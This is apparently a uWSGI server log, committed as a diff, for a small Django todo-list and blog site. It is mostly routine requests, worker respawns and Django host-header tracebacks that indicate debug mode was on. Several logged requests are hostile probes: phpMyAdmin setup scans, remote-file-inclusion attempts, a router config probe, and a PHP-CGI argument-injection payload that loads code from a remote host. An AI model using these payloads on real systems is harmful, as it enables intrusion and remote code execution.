+[pid: 29114|app: 0|req: 6/41] 220.181.108.107 () {40 vars in 546 bytes} [Sun Apr  2 08:34:29 2017] GET / => generated 2572 bytes in 49 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29615|app: 0|req: 4/42] 124.248.220.122 () {44 vars in 858 bytes} [Sun Apr  2 09:25:55 2017] GET /todolist => generated 3523 bytes in 537 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29114|app: 0|req: 7/43] 124.248.220.122 () {44 vars in 858 bytes} [Sun Apr  2 09:25:58 2017] GET /blog => generated 15438 bytes in 608 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 31168|app: 0|req: 7/44] 124.248.220.122 () {44 vars in 846 bytes} [Sun Apr  2 09:26:08 2017] GET / => generated 2572 bytes in 82 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 1 (pid: 29114) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 1 (new pid: 4239)
+[pid: 29139|app: 0|req: 5/45] 124.248.220.122 () {42 vars in 805 bytes} [Sun Apr  2 09:28:23 2017] GET / => generated 2572 bytes in 54 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29832|app: 0|req: 3/46] 111.193.213.142 () {46 vars in 866 bytes} [Sun Apr  2 09:30:26 2017] GET / => generated 2572 bytes in 49 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 4239|app: 0|req: 8/47] 111.193.213.142 () {46 vars in 882 bytes} [Sun Apr  2 09:30:29 2017] GET /todolist => generated 3523 bytes in 842 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29615|app: 0|req: 5/48] 111.193.213.142 () {46 vars in 882 bytes} [Sun Apr  2 09:30:32 2017] GET /blog => generated 15438 bytes in 178 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 3 (pid: 29615) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 3 (new pid: 4334)
+[pid: 29612|app: 0|req: 5/49] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 10:23:28 2017] GET / => generated 2572 bytes in 150 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29586|app: 0|req: 6/50] 139.162.119.197 () {32 vars in 462 bytes} [Sun Apr  2 11:19:20 2017] GET / => generated 2572 bytes in 51 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29586|app: 0|req: 7/51] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 11:35:59 2017] GET / => generated 2572 bytes in 61 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29620|app: 0|req: 5/52] 196.52.43.54 () {30 vars in 382 bytes} [Sun Apr  2 12:30:03 2017] GET / => generated 2572 bytes in 182 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 1427|app: 0|req: 6/53] 66.102.9.132 () {38 vars in 627 bytes} [Sun Apr  2 12:45:33 2017] GET / => generated 2572 bytes in 29137 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 1 (pid: 4239) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 1 (new pid: 6040)
+[pid: 4334|app: 0|req: 6/54] 66.102.9.129 () {38 vars in 593 bytes} [Sun Apr  2 12:46:03 2017] GET /favicon.ico => generated 2819 bytes in 312 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 29139|app: 0|req: 6/55] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 13:03:08 2017] GET / => generated 2572 bytes in 53 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 31168|app: 0|req: 8/56] 157.55.39.251 () {40 vars in 553 bytes} [Sun Apr  2 13:32:02 2017] GET /robots.txt => generated 2816 bytes in 41 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 31168|app: 0|req: 9/57] 157.55.39.172 () {42 vars in 570 bytes} [Sun Apr  2 14:17:08 2017] GET / => generated 2572 bytes in 42 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29612|app: 0|req: 6/58] 42.236.99.166 () {42 vars in 567 bytes} [Sun Apr  2 14:34:19 2017] GET /9 => generated 0 bytes in 33 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+[pid: 31168|app: 0|req: 10/59] 42.236.99.130 () {42 vars in 568 bytes} [Sun Apr  2 14:34:19 2017] GET /8 => generated 0 bytes in 30 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+[pid: 29620|app: 0|req: 6/60] 42.236.99.178 () {42 vars in 567 bytes} [Sun Apr  2 14:34:20 2017] GET /7 => generated 0 bytes in 10093 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+DAMN ! worker 10 (pid: 28516) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 10 (new pid: 7079)
+[pid: 29832|app: 0|req: 4/61] 180.163.220.96 () {42 vars in 615 bytes} [Sun Apr  2 14:34:20 2017] GET / => generated 2572 bytes in 21362 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 10 (pid: 29139) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 10 (new pid: 7082)
+DAMN ! worker 8 (pid: 29612) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 8 (new pid: 7084)
+DAMN ! worker 5 (pid: 29586) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 5 (new pid: 7085)
+[pid: 6040|app: 0|req: 9/62] 42.236.99.166 () {42 vars in 570 bytes} [Sun Apr  2 14:34:19 2017] GET /9/ => generated 5109 bytes in 60189 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 29620|app: 0|req: 7/63] 42.236.99.178 () {42 vars in 570 bytes} [Sun Apr  2 14:34:31 2017] GET /7/ => generated 3357 bytes in 51179 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+Sun Apr  2 14:35:25 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /5/ (ip 180.163.220.42) !!!
+Sun Apr  2 14:35:25 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET /5/ (180.163.220.42)
+OSError: write error
+[pid: 4334|app: 0|req: 7/64] 180.163.220.42 () {42 vars in 621 bytes} [Sun Apr  2 14:34:20 2017] GET /5/ => generated 0 bytes in 65382 msecs (HTTP/1.1 200) 2 headers in 0 bytes (0 switches on core 0)
+DAMN ! worker 6 (pid: 1427) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 6 (new pid: 7089)
+[pid: 31168|app: 0|req: 11/65] 42.236.10.106 () {38 vars in 658 bytes} [Sun Apr  2 14:40:20 2017] GET / => generated 2572 bytes in 51 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7089|app: 0|req: 8/66] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 14:40:49 2017] GET / => generated 2572 bytes in 173 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 3 (pid: 4334) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 3 (new pid: 7135)
+[pid: 6040|app: 0|req: 10/67] 34.253.8.197 () {38 vars in 519 bytes} [Sun Apr  2 15:17:59 2017] GET /w00tw00t.at.blackhats.romanian.anti-sec:) => generated 2909 bytes in 34 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 29620|app: 0|req: 8/68] 34.253.8.197 () {38 vars in 493 bytes} [Sun Apr  2 15:17:59 2017] GET /phpMyAdmin/scripts/setup.php => generated 2870 bytes in 13 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 7135|app: 0|req: 8/69] 34.253.8.197 () {38 vars in 493 bytes} [Sun Apr  2 15:18:00 2017] GET /phpmyadmin/scripts/setup.php => generated 2870 bytes in 75 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 7089|app: 0|req: 9/70] 34.253.8.197 () {38 vars in 479 bytes} [Sun Apr  2 15:18:00 2017] GET /pma/scripts/setup.php => generated 2849 bytes in 13 msecs (HTTP/1.1 404) 2 headers in 80 bytes (2 switches on core 0)
+[pid: 7135|app: 0|req: 9/71] 34.253.8.197 () {38 vars in 487 bytes} [Sun Apr  2 15:18:01 2017] GET /myadmin/scripts/setup.php => generated 2861 bytes in 4 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 7085|app: 0|req: 9/72] 34.253.8.197 () {38 vars in 487 bytes} [Sun Apr  2 15:18:01 2017] GET /MyAdmin/scripts/setup.php => generated 2861 bytes in 93 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 31168|app: 0|req: 12/73] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 15:54:52 2017] GET / => generated 2572 bytes in 49 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 31168|app: 0|req: 13/74] 191.96.249.97 () {28 vars in 361 bytes} [Sun Apr  2 16:29:40 2017] GET /phpmyadmin/scripts/setup.php => generated 2870 bytes in 44 msecs (HTTP/1.0 404) 2 headers in 80 bytes (1 switches on core 0)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'testp3.pospr.waw.pl'. You may need to add 'testp3.pospr.waw.pl' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'testp3.pospr.waw.pl'. You may need to add 'testp3.pospr.waw.pl' to ALLOWED_HOSTS.
+[pid: 7085|app: 0|req: 10/75] 91.196.50.33 () {38 vars in 619 bytes} [Sun Apr  2 16:34:13 2017] GET /testproxy.php => generated 0 bytes in 298 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+[pid: 29832|app: 0|req: 5/76] 220.181.108.116 () {40 vars in 546 bytes} [Sun Apr  2 16:59:24 2017] GET / => generated 2572 bytes in 68 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 32036|app: 0|req: 11/77] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 17:22:23 2017] GET / => generated 2572 bytes in 51 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+Sun Apr  2 19:18:01 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 185.169.230.8) !!!
+Sun Apr  2 19:18:01 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET / (185.169.230.8)
+OSError: write error
+[pid: 7084|app: 0|req: 8/78] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 19:17:18 2017] GET / => generated 0 bytes in 42578 msecs (HTTP/1.0 200) 2 headers in 0 bytes (0 switches on core 0)
+DAMN ! worker 1 (pid: 6040) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 1 (new pid: 9035)
+DAMN ! worker 2 (pid: 29620) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 2 (new pid: 9650)
+[pid: 7089|app: 0|req: 10/79] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 20:47:44 2017] GET / => generated 2572 bytes in 48 msecs (HTTP/1.0 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 7084|app: 0|req: 9/80] 123.151.38.94 () {42 vars in 889 bytes} [Sun Apr  2 21:10:12 2017] GET /?from=singlemessage => generated 2572 bytes in 56 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9650|app: 0|req: 9/81] 180.153.214.192 () {38 vars in 676 bytes} [Sun Apr  2 21:10:21 2017] GET /?from=singlemessage => generated 2572 bytes in 81 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 11/82] 123.151.38.94 () {46 vars in 1026 bytes} [Sun Apr  2 21:10:24 2017] GET / => generated 2572 bytes in 65 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 31168|app: 0|req: 14/83] 111.161.52.28 () {40 vars in 694 bytes} [Sun Apr  2 21:10:24 2017] GET / => generated 2572 bytes in 35 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9650|app: 0|req: 10/84] 111.30.132.194 () {40 vars in 695 bytes} [Sun Apr  2 21:10:25 2017] GET / => generated 2572 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 32036|app: 0|req: 12/85] 180.153.211.190 () {38 vars in 683 bytes} [Sun Apr  2 21:10:34 2017] GET / => generated 2572 bytes in 45 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29832|app: 0|req: 6/86] 123.151.38.94 () {44 vars in 1007 bytes} [Sun Apr  2 21:10:38 2017] GET /?from=singlemessage => generated 2572 bytes in 45 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7084|app: 0|req: 10/87] 123.151.38.94 () {46 vars in 1026 bytes} [Sun Apr  2 21:10:46 2017] GET / => generated 2572 bytes in 40 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9650|app: 0|req: 11/88] 123.151.38.94 () {46 vars in 1023 bytes} [Sun Apr  2 21:10:48 2017] GET /todolist => generated 3523 bytes in 470 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9650|app: 0|req: 12/89] 123.151.38.94 () {46 vars in 1023 bytes} [Sun Apr  2 21:10:58 2017] GET /blog => generated 15438 bytes in 759 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+DAMN ! worker 2 (pid: 9650) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 2 (new pid: 9912)
+[pid: 31168|app: 0|req: 15/90] 101.226.33.208 () {38 vars in 700 bytes} [Sun Apr  2 21:10:58 2017] GET /todolist => generated 3523 bytes in 7713 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 32036|app: 0|req: 13/91] 101.226.66.178 () {38 vars in 734 bytes} [Sun Apr  2 21:11:08 2017] GET /blog => generated 15438 bytes in 651 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29832|app: 0|req: 7/92] 123.151.38.94 () {46 vars in 1011 bytes} [Sun Apr  2 21:11:36 2017] GET / => generated 2572 bytes in 102 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 32036|app: 0|req: 14/93] 123.151.38.94 () {46 vars in 1023 bytes} [Sun Apr  2 21:11:43 2017] GET /todolist => generated 3523 bytes in 134 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 7 (pid: 32036) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 7 (new pid: 9932)
+[pid: 7135|app: 0|req: 10/94] 123.151.38.94 () {46 vars in 1023 bytes} [Sun Apr  2 21:11:58 2017] GET /blog => generated 15438 bytes in 7258 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 5 (pid: 7085) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 5 (new pid: 9933)
+[pid: 7084|app: 0|req: 11/95] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 22:02:24 2017] GET / => generated 2572 bytes in 52 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 13/96] 37.122.208.196 () {38 vars in 634 bytes} [Sun Apr  2 23:07:16 2017] GET /appserv/main.php?appserv_root=http://mail.ampress.com/taskware/uploads/a.txt? => generated 2895 bytes in 122 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 9933|app: 0|req: 12/97] 37.122.208.196 () {38 vars in 670 bytes} [Sun Apr  2 23:07:17 2017] GET /webcalendar/tools/send_reminders.php?includedir=http://mail.ampress.com/taskware/uploads/a.txt? => generated 2953 bytes in 99 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 14/98] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 23:21:59 2017] GET / => generated 2572 bytes in 84 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29832|app: 0|req: 8/99] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 00:48:43 2017] GET / => generated 2572 bytes in 45 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7082|app: 0|req: 8/100] 176.240.193.163 () {26 vars in 283 bytes} [Mon Apr  3 00:51:10 2017] GET / => generated 2572 bytes in 8047 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7084|app: 0|req: 12/101] 176.240.193.163 () {26 vars in 283 bytes} [Mon Apr  3 00:51:22 2017] GET / => generated 2572 bytes in 1128 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 3 (pid: 7135) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 3 (new pid: 10870)
+[pid: 9933|app: 0|req: 13/102] 176.240.193.163 () {26 vars in 283 bytes} [Mon Apr  3 00:51:26 2017] GET / => generated 2572 bytes in 59 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 10870|app: 0|req: 11/103] 176.240.193.163 () {26 vars in 283 bytes} [Mon Apr  3 00:51:27 2017] GET / => generated 2572 bytes in 119 msecs (HTTP/1.0 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 7084|app: 0|req: 13/104] 176.240.193.163 () {26 vars in 283 bytes} [Mon Apr  3 00:51:30 2017] GET / => generated 2572 bytes in 55 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7089|app: 0|req: 11/105] 176.240.193.163 () {26 vars in 283 bytes} [Mon Apr  3 00:51:45 2017] GET / => generated 2572 bytes in 53 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 15/106] 82.154.182.198 () {26 vars in 282 bytes} [Mon Apr  3 01:05:31 2017] GET / => generated 2572 bytes in 50 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7082|app: 0|req: 9/107] 40.77.167.8 () {42 vars in 569 bytes} [Mon Apr  3 01:16:43 2017] GET / => generated 2572 bytes in 43 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7084|app: 0|req: 14/108] 131.161.8.223 () {36 vars in 518 bytes} [Mon Apr  3 01:17:57 2017] GET / => generated 2572 bytes in 49 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 12/109] 61.135.169.10 () {32 vars in 470 bytes} [Mon Apr  3 01:20:12 2017] GET / => generated 2572 bytes in 68 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7082|app: 0|req: 10/110] 62.1.214.12 () {26 vars in 278 bytes} [Mon Apr  3 01:45:06 2017] GET / => generated 2572 bytes in 44 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 16/111] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 02:35:56 2017] GET / => generated 2572 bytes in 42 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 9 (pid: 31168) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 9 (new pid: 11353)
+[pid: 9932|app: 0|req: 15/112] 182.118.60.64 () {42 vars in 560 bytes} [Mon Apr  3 03:03:52 2017] GET /5/ => generated 6732 bytes in 723 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7082|app: 0|req: 11/113] 219.102.78.225 () {26 vars in 282 bytes} [Mon Apr  3 04:01:40 2017] GET / => generated 2572 bytes in 57 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9933|app: 0|req: 14/114] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 04:01:56 2017] GET / => generated 2572 bytes in 43 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 13/115] 220.181.51.113 () {38 vars in 561 bytes} [Mon Apr  3 04:02:24 2017] GET /robots.txt => generated 2816 bytes in 43 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 7084|app: 0|req: 15/116] 180.149.130.14 () {38 vars in 623 bytes} [Mon Apr  3 04:25:31 2017] GET / => generated 2572 bytes in 42 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 14/117] 220.181.51.116 () {38 vars in 571 bytes} [Mon Apr  3 05:12:14 2017] GET / => generated 2572 bytes in 51 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 4 (pid: 29832) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 4 (new pid: 11990)
+[pid: 10870|app: 0|req: 12/118] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 05:29:09 2017] GET / => generated 2572 bytes in 56 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9933|app: 0|req: 15/119] 180.97.63.11 () {42 vars in 565 bytes} [Mon Apr  3 06:35:57 2017] GET /blog => generated 15438 bytes in 649 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9932|app: 0|req: 16/120] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 06:50:40 2017] GET / => generated 2572 bytes in 62 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7089|app: 0|req: 12/121] 191.96.249.97 () {28 vars in 844 bytes} [Mon Apr  3 07:06:43 2017] GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n => generated 3081 bytes in 43 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+DAMN ! worker 7 (pid: 9932) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 7 (new pid: 12470)
+[pid: 9035|app: 0|req: 15/122] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 08:31:15 2017] GET / => generated 2572 bytes in 55 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 5 (pid: 9933) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 5 (new pid: 12685)
+[pid: 7089|app: 0|req: 13/123] 123.125.71.44 () {40 vars in 544 bytes} [Mon Apr  3 09:12:18 2017] GET / => generated 2572 bytes in 42 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 12685|app: 0|req: 16/124] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 09:41:52 2017] GET / => generated 2572 bytes in 121 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 12685|app: 0|req: 17/125] 51.15.141.187 () {36 vars in 646 bytes} [Mon Apr  3 10:01:40 2017] GET /cgi-bin/user/Config.cgi?.cab&action=get&category=Account.* => generated 2897 bytes in 18 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'android.sukima.me'. You may need to add 'android.sukima.me' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'android.sukima.me'. You may need to add 'android.sukima.me' to ALLOWED_HOSTS.
+[pid: 12685|app: 0|req: 18/126] 169.54.244.75 () {28 vars in 311 bytes} [Mon Apr  3 10:29:02 2017] GET / => generated 0 bytes in 236 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+[pid: 7084|app: 0|req: 16/127] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 11:05:44 2017] GET / => generated 2572 bytes in 39 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
